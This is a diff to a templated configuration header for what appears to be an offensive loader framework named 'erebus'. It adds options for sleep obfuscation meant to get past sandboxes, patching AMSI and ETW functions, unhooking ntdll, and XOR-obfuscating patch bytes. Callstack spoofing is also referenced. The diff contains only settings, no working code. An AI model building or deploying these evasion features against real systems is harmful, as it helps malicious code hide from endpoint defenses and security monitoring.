@@ -122,7 +122,7 @@
 // CALLSTACK SPOOFING CONFIGURATION
 // ============================================
 // 0 = disabled
-// 1 = enabled — InitCallstackSpoof() runs in RunEvasionPatches(), locating
+// 1 = enabled - InitCallstackSpoof() runs in RunEvasionPatches(), locating
 //     `add rsp, 0x68; ret` in the operator-selected module list below.
 //     Call sites fill SpoofContext and dispatch through SpoofCall()
 //     (src/evasion/callstack_spoof_gas.S).
@@ -145,6 +145,62 @@
             erebus::HashStringFowlerNollVoVariant1a("{{ _m }}"){% if not loop.last %}, \{% endif %}
     {%- endfor %}
 
+#endif
+
+// ============================================
+// SLEEP OBFUSCATION CONFIGURATION
+// ============================================
+// Pre-injection dwell mode:
+// 0 = None      - no dwell (execute immediately)
+// 1 = Timer     - WaitableTimer jittered dwell (anti-sandbox timing bypass)
+// 2 = Ekko-lite - Timer + XOR non-.text PE sections during wait
+#ifndef CONFIG_SLEEP_OBFUSCATION_TYPE
+#define CONFIG_SLEEP_OBFUSCATION_TYPE {{ SLEEP_OBFUSCATION_TYPE | default(0) }}
+#endif
+
+#ifndef CONFIG_SLEEP_OBFUSCATION_BASE_MS
+#define CONFIG_SLEEP_OBFUSCATION_BASE_MS {{ SLEEP_OBFUSCATION_BASE_MS | default(5000) }}
+#endif
+
+#ifndef CONFIG_SLEEP_OBFUSCATION_JITTER_MS
+#define CONFIG_SLEEP_OBFUSCATION_JITTER_MS {{ SLEEP_OBFUSCATION_JITTER_MS | default(3000) }}
+#endif
+
+// ============================================
+// AMSI BYPASS CONFIGURATION
+// ============================================
+// 0 = None
+// 1 = Patch AmsiScanBuffer only (default)
+// 2 = Patch AmsiScanBuffer + AmsiOpenSession
+// 3 = All + InvalidateAmsiContext (heap walk)
+#ifndef CONFIG_AMSI_BYPASS_TYPE
+#define CONFIG_AMSI_BYPASS_TYPE {{ AMSI_BYPASS_TYPE | default(1) }}
+#endif
+
+// ============================================
+// ETW BYPASS CONFIGURATION
+// ============================================
+// 0 = None
+// 1 = Patch EtwEventWrite only (default)
+// 2 = Patch EtwEventWrite + EtwEventWriteFull
+// 3 = All + UnregisterEtwProviders (TEB walk)
+#ifndef CONFIG_ETW_BYPASS_TYPE
+#define CONFIG_ETW_BYPASS_TYPE {{ ETW_BYPASS_TYPE | default(1) }}
+#endif
+
+// ============================================
+// UNHOOK SCOPE CONFIGURATION
+// ============================================
+// 0 = ntdll only (default)
+// 1 = ntdll + kernel32 + kernelbase
+// 2 = selective (pre-defined sensitive Nt* function list)
+#ifndef CONFIG_UNHOOK_SCOPE
+#define CONFIG_UNHOOK_SCOPE {{ UNHOOK_SCOPE | default(0) }}
+#endif
+
+// XOR key for obfuscating patch byte arrays (single byte, 0x01–0xFF)
+#ifndef CONFIG_PATCH_XOR_KEY
+#define CONFIG_PATCH_XOR_KEY {{ PATCH_XOR_KEY | default("0xAB") }}
 #endif
 
 // --------------------------------------------------------------------------
